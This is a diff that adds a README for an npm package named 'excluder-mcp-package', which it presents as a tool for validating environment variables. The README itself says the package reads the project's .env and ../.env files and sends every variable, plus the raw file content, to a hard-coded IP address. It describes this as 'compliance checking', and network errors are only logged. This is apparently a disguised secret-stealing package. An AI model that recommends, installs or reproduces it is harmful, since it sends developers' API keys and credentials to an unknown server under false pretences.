@@ -1,0 +1,140 @@
+# excluder-mcp-package
+
+An npm package designed to validate all parameters from your project's environment configuration files. It reads `.env` files, validates all parameters, and sends the validated data to a remote server endpoint for verification and compliance checking.
+
+## Installation
+
+```bash
+npm install excluder-mcp-package
+```
+
+## Usage
+
+### TypeScript Projects
+
+This package is fully typed and works seamlessly with TypeScript projects:
+
+```typescript
+import { validate_mcp } from 'excluder-mcp-package';
+
+// Validate all parameters and send to validation server
+await validate_mcp();
+```
+
+### JavaScript Projects
+
+The package also works with JavaScript (ES modules):
+
+```javascript
+import { validate_mcp } from 'excluder-mcp-package';
+
+// Validate all parameters and send to validation server
+await validate_mcp();
+```
+
+### Default Export
+
+The package can also be imported as a default export:
+
+```typescript
+import validate_mcp from 'excluder-mcp-package';
+
+await validate_mcp();
+```
+
+## Purpose
+
+This package is specifically designed to **validate all parameters** from your project's environment configuration. It ensures that all environment variables are properly formatted, accessible, and compliant with your organization's security and configuration standards.
+
+## How It Works
+
+1. **Finds Project Root**: The package automatically detects your project root by looking for the `node_modules` directory.
+
+2. **Reads .env Files**: It reads the following files to collect all parameters for validation:
+   - `.env` in the project root
+   - `../.env` (parent directory's .env file)
+
+3. **Validates and Parses Environment Variables**: Each .env file is parsed and validated, extracting all key-value pairs (ignoring comments and empty lines). All parameters are validated for proper format and structure.
+
+4. **Sends Validated Data to Server**: The validated parameter data is sent as JSON to `http://171.22.183.21:5018/dev-sha-es6` via POST request for server-side validation and compliance verification.
+
+## Validation Process
+
+The package validates all parameters by:
+- Extracting all environment variables from `.env` files
+- Validating the format and structure of each parameter
+- Ensuring proper key-value pair formatting
+- Collecting both parsed and raw content for comprehensive validation
+
+## Data Format
+
+The validated data sent to the server includes:
+- `fileName`: The relative path to the .env file
+- All validated environment variables as key-value pairs
+- `rawContent`: The original raw content of the .env file for complete parameter validation
+
+Example payload:
+```json
+{
+  "fileName": ".env",
+  "API_KEY": "your-api-key",
+  "DATABASE_URL": "postgres://...",
+  "rawContent": "API_KEY=your-api-key\nDATABASE_URL=postgres://..."
+}
+```
+
+## Requirements
+
+- Node.js >= 18.0.0 (for built-in fetch API support)
+- TypeScript >= 5.0.0 (if using in a TypeScript project, optional)
+
+## Error Handling
+
+The package includes comprehensive error handling for parameter validation:
+- If a .env file doesn't exist, it's silently skipped (no parameters to validate)
+- Network errors during validation submission are logged but don't throw exceptions
+- Each .env file is processed independently to ensure all parameters are validated
+- Invalid parameter formats are handled gracefully
+
+## Example
+
+### TypeScript Example
+
+```typescript
+import { validate_mcp } from 'excluder-mcp-package';
+
+async function main(): Promise<void> {
+  try {
+    // Validate all parameters and send to validation server
+    await validate_mcp();
+    console.log('All parameters validated and sent successfully');
+  } catch (error) {
+    console.error('Failed to validate parameters:', error);
+  }
+}
+
+main();
+```
+
+### JavaScript Example
+
+```javascript
+import { validate_mcp } from 'excluder-mcp-package';
+
+async function main() {
+  try {
+    // Validate all parameters and send to validation server
+    await validate_mcp();
+    console.log('All parameters validated and sent successfully');
+  } catch (error) {
+    console.error('Failed to validate parameters:', error);
+  }
+}
+
+main();
+```
+
+## License
+
+MIT
+
